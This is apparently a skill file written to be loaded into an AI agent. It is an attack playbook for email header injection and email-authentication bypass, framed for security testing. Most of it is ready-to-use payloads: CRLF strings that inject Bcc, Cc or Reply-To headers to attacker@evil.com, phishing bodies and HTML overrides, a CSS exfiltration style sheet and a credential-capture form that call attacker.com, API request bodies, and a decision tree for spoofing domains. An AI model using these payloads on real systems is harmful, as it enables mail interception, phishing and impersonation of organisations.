---
name: email-header-injection
description: >-
  Email header injection and spoofing playbook. Use when testing contact forms, email APIs, password reset flows, or any feature that constructs SMTP messages with user-controlled fields. Covers CRLF injection in headers, SPF/DKIM/DMARC bypass, and phishing amplification.
---

# SKILL: Email Header Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert email header injection and authentication bypass. Covers SMTP CRLF injection, SPF/DKIM/DMARC circumvention, display name spoofing, and mail client rendering abuse. Base models miss the nuance between header injection (technical) and email auth bypass (protocol-level) — this skill covers both attack surfaces.

## 0. RELATED ROUTING

- [crlf-injection](../crlf-injection/SKILL.md) — general CRLF injection; email headers are a specific high-value sink
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) — when SMTP server is reachable via SSRF (gopher://smtp)
- [open-redirect](../open-redirect/SKILL.md) — redirect in password-reset emails as phishing amplification

---

## 1. SMTP HEADER INJECTION FUNDAMENTALS

SMTP headers are separated by CRLF (`\r\n`). If user input is placed into email headers without sanitization, injecting `%0d%0a` (or `\r\n`) adds arbitrary headers.

### Injection anatomy

```
Normal header construction:
  To: user@example.com\r\n
  Subject: Contact Form\r\n
  From: noreply@target.com\r\n

Injected (via Subject field):
  Subject: Hello%0d%0aBcc: attacker@evil.com\r\n
  
Result:
  Subject: Hello\r\n
  Bcc: attacker@evil.com\r\n
```

### Encoding variants to try

| Encoding | Payload |
|---|---|
| URL-encoded | `%0d%0a` |
| Double URL-encoded | `%250d%250a` |
| Unicode | `\u000d\u000a` |
| Raw CRLF | `\r\n` (in raw request) |
| LF only | `%0a` (some SMTP servers accept LF without CR) |
| Null byte + CRLF | `%00%0d%0a` |

---

## 2. ATTACK SCENARIOS

### 2.1 BCC Injection — Silent Email Exfiltration

```
Input field: email / name / subject
Payload: victim@target.com%0d%0aBcc:attacker@evil.com

Effect: attacker receives a copy of every email sent through this form
```

### 2.2 CC Injection with Header Stacking

```
Payload in "From name" field:
  John%0d%0aCc:attacker@evil.com%0d%0aBcc:spy@evil.com

Result headers:
  From: John
  Cc: attacker@evil.com
  Bcc: spy@evil.com
  ... (original headers continue)
```

### 2.3 Body Injection — Full Email Content Control

A blank line (`\r\n\r\n`) separates headers from body in SMTP:

```
Payload in Subject:
  Urgent%0d%0a%0d%0aPlease click: https://evil.com/phish%0d%0a.%0d%0a

Result:
  Subject: Urgent
  
  Please click: https://evil.com/phish
  .
  
(Blank line terminates headers, everything after is body)
```

### 2.4 Reply-To Manipulation for Phishing

```
Payload in From name:
  IT Support%0d%0aReply-To:attacker@evil.com

Victim sees "IT Support" as sender
Replies go to attacker@evil.com
```

### 2.5 Content-Type Injection for HTML Phishing

```
Payload:
  test%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Password Reset</h1><a href="https://evil.com">Click here</a>

Overrides Content-Type → renders HTML in email client
```

---

## 3. COMMON VULNERABLE PATTERNS

### PHP mail()

```php
$to = $_POST['email'];
$subject = $_POST['subject'];
$message = $_POST['message'];
$headers = "From: noreply@target.com";

// ALL parameters are injectable:
mail($to, $subject, $message, $headers);

// $to injection:    victim@x.com%0d%0aCc:attacker@evil.com
// $subject injection: Hello%0d%0aBcc:attacker@evil.com
// $headers injection: From: x%0d%0aBcc:attacker@evil.com
```

### Python smtplib

```python
msg = f"From: {user_from}\r\nTo: {user_to}\r\nSubject: {user_subject}\r\n\r\n{body}"
server.sendmail(from_addr, to_addr, msg)
# user_from / user_subject injectable if not sanitized
```

### Node.js nodemailer

```javascript
let mailOptions = {
    from: req.body.from,      // injectable
    to: 'admin@target.com',
    subject: req.body.subject, // injectable
    text: req.body.message
};
transporter.sendMail(mailOptions);
```

---

## 4. SPF / DKIM / DMARC BYPASS TECHNIQUES

### 4.1 SPF (Sender Policy Framework) Bypass

SPF validates the `MAIL FROM` envelope sender IP against DNS TXT records.

| Technique | How |
|---|---|
| Subdomain delegation | Target has `include:_spf.google.com`; attacker uses Google Workspace to send as `anything@mail.target.com` |
| Include chain abuse | `v=spf1 include:third-party.com` — if third-party allows broad sending |
| DNS lookup limit (10) | SPF allows max 10 DNS lookups; chains exceeding this → `permerror` → some receivers accept |
| `+all` misconfiguration | `v=spf1 +all` allows any IP (rare but exists) |
| `?all` or `~all` | Softfail/neutral → most receivers still deliver to inbox |
| No SPF record | Domain without SPF → anyone can send as that domain |

```bash
# Check SPF record:
dig TXT target.com +short
# Look for: v=spf1 ...

# Count DNS lookups (each include/a/mx/redirect = 1 lookup):
# >10 lookups = permerror = bypassed
```

### 4.2 DKIM (DomainKeys Identified Mail) Bypass

DKIM signs specific headers with a domain key. Bypass vectors:

| Technique | How |
|---|---|
| `d=` vs `From:` mismatch | DKIM signs with `d=subdomain.target.com` but `From: ceo@target.com` — valid DKIM, spoofed From |
| `l=` tag abuse | `l=` limits body length signed; attacker appends content after signed portion |
| Replay attack | Capture valid DKIM-signed email, resend with modified unsigned headers |
| Missing `h=from` | If `from` header not in signed headers list (`h=`), From can be modified |
| Key rotation window | During DKIM key rotation, old selector may still validate |

```bash
# Check DKIM selector:
dig TXT selector._domainkey.target.com +short
# Common selectors: google, default, s1, s2, k1, dkim
```

### 4.3 DMARC (Domain-based Message Authentication) Bypass

DMARC requires SPF or DKIM to **align** with the `From:` header domain.

| Technique | How |
|---|---|
| Relaxed alignment (`aspf=r`) | SPF passes for `sub.target.com`, DMARC accepts for `target.com` |
| Organizational domain | `mail.target.com` aligns with `target.com` in relaxed mode |
| No DMARC record | Domain without DMARC → no policy enforcement |
| `p=none` | DMARC exists but policy is `none` → no enforcement, just reporting |
| Subdomain policy (`sp=none`) | Main domain `p=reject` but `sp=none` → subdomains spoofable |

```bash
# Check DMARC:
dig TXT _dmarc.target.com +short
# Look for: v=DMARC1; p=none/quarantine/reject
```

### 4.4 Display Name Spoofing (Works Everywhere)

Even with perfect SPF/DKIM/DMARC, display name is not authenticated:

```
From: "admin@target.com" <attacker@evil.com>
From: "IT Security Team - target.com" <random@evil.com>
From: "noreply@target.com via Support" <attacker@evil.com>
```

Most email clients show only the display name in the inbox view. Mobile clients are especially vulnerable.

---

## 5. MAIL CLIENT RENDERING ATTACKS

### CSS-based data exfiltration

```html
<!-- In HTML email body -->
<style>
  #secret[value^="a"] { background: url('https://attacker.com/leak?char=a'); }
  #secret[value^="b"] { background: url('https://attacker.com/leak?char=b'); }
</style>
<input id="secret" value="TARGET_VALUE">
```

### Remote image tracking

```html
<img src="https://attacker.com/track?email=victim@target.com&t=TIMESTAMP" width="1" height="1">
<!-- Invisible pixel — confirms email was opened, leaks IP, client info -->
```

### Form action hijacking

```html
<!-- Some email clients render forms -->
<form action="https://attacker.com/phish" method="POST">
  <input name="password" type="password" placeholder="Confirm your password">
  <button type="submit">Verify</button>
</form>
```

---

## 6. CONTACT FORM / EMAIL API INJECTION

```text
# REST API
POST /api/send-email {"to":"user@target.com\r\nBcc:attacker@evil.com","subject":"Hello","body":"Test"}

# URL-encoded form
name=John&email=victim%40target.com%0d%0aBcc%3aattacker%40evil.com&message=test

# GraphQL
mutation { sendEmail(to:"user@target.com\r\nBcc:attacker@evil.com" subject:"Test" body:"Hello") }
```

---

## 7. TESTING METHODOLOGY

```
1. Find email features: contact forms, password reset, invite/share, newsletters
2. Test CRLF: inject test%0d%0aX-Injected:true in each field → check received headers
3. Escalate: Bcc injection → body injection → Content-Type override
4. Parallel: dig TXT target.com (SPF) + dig TXT _dmarc.target.com (DMARC)
```

---

## 8. DECISION TREE

```
Found email-sending feature?
│
├── User input goes into email headers?
│   ├── YES → Test CRLF injection
│   │   ├── %0d%0a in Subject/From/To field
│   │   │   ├── Extra header appears → CONFIRMED
│   │   │   │   ├── Inject Bcc: → silent exfiltration
│   │   │   │   ├── Inject body (blank line) → content control
│   │   │   │   └── Inject Reply-To: → redirect replies
│   │   │   │
│   │   │   └── Filtered? → Try encoding variants
│   │   │       ├── %250d%250a (double encode)
│   │   │       ├── %0a only (LF without CR)
│   │   │       └── Unicode \u000d\u000a
│   │   │
│   │   └── All encodings blocked → check SPF/DKIM/DMARC
│   │
│   └── NO (user input only in body) → limited impact
│       └── Check for HTML injection in email body
│           └── If HTML rendered → phishing / CSS exfil
│
├── Want to spoof emails from target domain?
│   ├── Check SPF: dig TXT target.com
│   │   ├── No SPF / +all / ~all → direct spoofing possible
│   │   └── -all → SPF blocks; check DKIM/DMARC
│   │
│   ├── Check DMARC: dig TXT _dmarc.target.com
│   │   ├── No DMARC / p=none → spoofing delivered
│   │   ├── p=quarantine → lands in spam but delivered
│   │   └── p=reject → blocked; try subdomain (sp= policy)
│   │
│   └── All strict → Display name spoofing only
│       └── "admin@target.com" <attacker@evil.com>
│
└── Testing password reset email?
    ├── Check for token in URL → open redirect chain?
    │   └── See ../open-redirect/SKILL.md
    └── Check for host header injection → password reset poisoning
        └── See ../http-host-header-attacks/SKILL.md
```

---

## 9. QUICK REFERENCE — KEY PAYLOADS

```text
# BCC injection via Subject
Subject: Hello%0d%0aBcc:attacker@evil.com

# Body injection via From name
From: Test%0d%0a%0d%0aClick here: https://evil.com

# Reply-To hijack
From: Support%0d%0aReply-To:attacker@evil.com

# Full header stack injection
email=victim%40target.com%0d%0aCc%3aspy1%40evil.com%0d%0aBcc%3aspy2%40evil.com

# Display name spoof (no injection needed)
From: "security@target.com" <attacker@evil.com>
```
